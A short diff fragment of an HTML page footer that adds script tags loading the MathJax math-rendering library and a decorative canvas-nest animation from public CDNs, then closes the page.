+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+<script type="text/javascript" color="0,0,0" opacity='0.7' zIndex="-2" count="20" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+</body>
+</html>
